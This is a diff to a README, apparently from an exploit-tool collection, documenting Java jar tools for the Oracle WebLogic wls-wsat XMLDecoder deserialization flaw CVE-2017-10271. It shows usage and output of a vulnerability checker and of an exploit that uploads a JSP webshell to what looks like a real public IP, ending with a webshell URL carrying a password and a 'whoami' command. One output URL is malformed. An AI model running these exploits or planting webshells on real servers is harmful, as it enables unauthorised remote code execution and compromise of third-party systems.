@@ -112,7 +112,7 @@
 > ```
 > USE:
 > ```
-> zhzy@debian:$ java18  -jar cve-2017-10271_webshell.jar 
+> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar 
 > [*]              Oracle : WebLogic wls-wsat RCE Exp
 > [*]              CVE ID : CVE-2017-3506 & CVE-2017-10271
 > [*]  Vulnerability info : https://secfree.com/article-635.html
@@ -123,7 +123,7 @@
 > ```
 > EXP:
 > ```
-> zhzy@debian:/debian/archives-tool/web-weblogic$ java18  -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp
+> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp
 > [*] Starting exploit...
 > [*] Sending payloads...
 > [*] Payloads sent...
@@ -133,3 +133,50 @@
 > [+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&command=whoami
 > ```
 
+## cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder反序列化漏洞检测脚本
+> VER:
+> ```
+> Oracle WebLogic Server10.3.6.0.0 版本
+> Oracle WebLogic Server12.1.3.0.0 版本
+> Oracle WebLogic Server12.2.1.1.0 版本
+> Oracle WebLogic Server12.2.1.2.0 版本
+> ```
+> USE:
+> ```
+> zhzy@debian:$ java -jar cve-2017-10271_poc.jar 
+> 
+> [*]         	WebLogic wls-wsat组件反序列化漏洞检测工具
+> [*]      CVE编号  CVE-2017-10271
+> [*]     漏洞详情  https://www.secfree.com/article-635.html
+> [*]     作者邮箱  Bearcat@secfree.com
+> [*] 使用方法:
+> [*]  单个URL检测  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -u http://www.xxx.com:7001
+> [*]     批量检测  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -f UrlfilePath
+> ```
+> EXP:
+> ```
+> zhzy@debian:$ java -jar cve-2017-10271_poc.jar -u http://59.110.214.109:7001
+> 
+> [11:33:37] [+] 漏洞存在 http://59.110.214.109:7001/wls-wsat/test.logs
+> ```
+
+## cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder反序列化漏洞利用脚本，上传Webshell
+> VER:
+> ```
+> Oracle WebLogic Server10.3.6.0.0 版本
+> Oracle WebLogic Server12.1.3.0.0 版本
+> Oracle WebLogic Server12.2.1.1.0 版本
+> Oracle WebLogic Server12.2.1.2.0 版本
+> ```
+> EXP:
+> ```
+> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar -u http://59.110.214.109:7001
+> 
+> [*] Starting exploit...
+> [*] Sending payloads...
+> [*] Payloads sent...
+> [*] Opening shell...
+> [*] pwned! Go ahead...
+> 
+> [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami
+> ```
